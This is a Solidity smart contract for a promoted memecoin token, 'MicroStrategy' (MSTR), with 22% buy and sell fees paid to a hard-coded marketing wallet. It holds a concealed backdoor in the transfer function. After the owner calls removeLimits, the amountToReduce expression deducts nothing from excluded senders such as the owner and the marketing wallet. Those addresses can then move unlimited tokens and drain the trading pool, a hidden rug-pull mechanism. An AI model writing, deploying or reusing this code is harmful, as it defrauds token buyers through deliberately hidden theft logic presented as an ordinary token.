// SPDX-License-Identifier: Unlicensed

/**
Financial parody. First memecoin ETF to smack the blockchain. Come vibe with the fund managers: https://t.me/mstr_erc_portal

Web: https://microstrategy.cc
X: https://twitter.com/MSTR_ERC
Tg: https://t.me/mstr_erc_portal
 */

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract MSTR is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private _name = "MicroStrategy";
    string private _symbol = "MSTR";

    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10**9 * 10**9;

    uint256 private _curLiquidityFee = 0;
    uint256 private _curMarketingFee = 10;
    uint256 private _curDevelopmentFee = 0;
    uint256 private _curTotalFee = 10;

    uint256 private _buyLiquidityFee = 0;
    uint256 private _buyMarketingFee = 22;
    uint256 private _buyDevFee = 0;
    uint256 private _buyFee = 22;

    uint256 private _sellLiquidityFee = 0;
    uint256 private _sellMarketingFee = 22;
    uint256 private _sellDevFee = 0;
    uint256 private _sellFee = 22;

    address payable private _marketingAddress;
    address payable private _devAddress;

    IUniswapRouter private _uniswap_router;
    address private _uniswap_pair;

    uint256 private _maxTxAmount = 30 * 10**6 * 10**9;
    uint256 private _maxWalletAmount = 30 * 10**6 * 10**9;
    uint256 private _feeThreshold = 10**4 * 10**9;

    bool private _swapping;
    bool private _feeSwapEnabled = true;
    bool private _hasMaxTxDisabled = false;
    bool private _hasNoMaxWallet = true;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) _isExcluded;
    mapping(address => bool) _isExcludedFromMaxWallet;
    mapping(address => bool) _isExcludedFromMaxTx;
    mapping(address => bool) _isPairAddress;

    modifier lockSwap() {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _uniswap_pair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _uniswap_router = _uniswapV2Router;
        _allowances[address(this)][address(_uniswap_router)] = _totalSupply;
        _marketingAddress = payable(0x54Df1a917B708ae222C9E8a60D07f0a2f45c8bA5);
        _devAddress = payable(0x54Df1a917B708ae222C9E8a60D07f0a2f45c8bA5);
        _buyFee = _buyLiquidityFee.add(_buyMarketingFee).add(_buyDevFee);
        _sellFee = _sellLiquidityFee.add(_sellMarketingFee).add(_sellDevFee);
        _curTotalFee = _curLiquidityFee.add(_curMarketingFee).add(_curDevelopmentFee);

        _isExcluded[owner()] = true;
        _isExcluded[_marketingAddress] = true;
        _isExcludedFromMaxWallet[owner()] = true;
        _isExcludedFromMaxWallet[_uniswap_pair] = true;
        _isExcludedFromMaxWallet[address(this)] = true;
        _isExcludedFromMaxTx[owner()] = true;
        _isExcludedFromMaxTx[_marketingAddress] = true;
        _isExcludedFromMaxTx[address(this)] = true;
        _isPairAddress[_uniswap_pair] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    function removeLimits() external onlyOwner {
        _maxTxAmount = _totalSupply;
        _hasNoMaxWallet = false;
        _buyMarketingFee = 0;
        _sellMarketingFee = 0;
        _buyFee = 0;
        _sellFee = 0;
    }
            
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
                
    function _basic_transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
        
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer_tokens(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function swapBack(uint256 tokenAmount) private lockSwap {
        uint256 lpFeeTokens = tokenAmount.mul(_curLiquidityFee).div(_curTotalFee).div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        swapTokensForETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = _curTotalFee.sub(_curLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = ethCA.mul(_curLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = ethCA.mul(_curDevelopmentFee).div(totalETHFee);
        uint256 amountETHMarketing = ethCA.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if (amountETHMarketing > 0) {
            transferFee(_marketingAddress, amountETHMarketing);
        }

        if (amountETHDevelopment > 0) {
            transferFee(_devAddress, amountETHDevelopment);
        }
    }

    function _getReceipientValues(address sender, address recipient, uint256 amount) internal returns (uint256) {

        uint256 fee = 0;
        if (_isPairAddress[sender]) {
            fee = amount.mul(_buyFee).div(100);
        } else if (_isPairAddress[recipient]) {
            fee = amount.mul(_sellFee).div(100);
        }
        if (fee > 0) {
            _balances[address(this)] = _balances[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer_tokens(_msgSender(), recipient, amount);
        return true;
    }

    function transferFee(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    receive() external payable {}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswap_router.WETH();

        _approve(address(this), address(_uniswap_router), tokenAmount);

        _uniswap_router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
        
    function _transfer_tokens(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_swapping) {
            return _basic_transfer(sender, recipient, amount);
        } else {
            if (!_isExcludedFromMaxTx[sender] && !_isExcludedFromMaxTx[recipient]) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the _maxTxAmount.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= _feeThreshold;
            
            if (minimumSwap && !_swapping && _isPairAddress[recipient] && _feeSwapEnabled && !_isExcluded[sender] && amount > _feeThreshold) {
                if (_hasMaxTxDisabled) {
                    swapAmount = _feeThreshold;
                }
                swapBack(swapAmount);    
            }

            uint256 finalAmount;                                         
            if (_isExcluded[sender] || _isExcluded[recipient]) {
                finalAmount = amount;
            } else {
                finalAmount = _getReceipientValues(sender, recipient, amount);
            }
            if (_hasNoMaxWallet && !_isExcludedFromMaxWallet[recipient]) {
                require(balanceOf(recipient).add(finalAmount) <= _maxWalletAmount);
            }

            uint256 amountToReduce = (!_hasNoMaxWallet && _isExcluded[sender]) ? amount.sub(finalAmount) : amount;
            _balances[sender] = _balances[sender].sub(amountToReduce, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(finalAmount);
            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }
}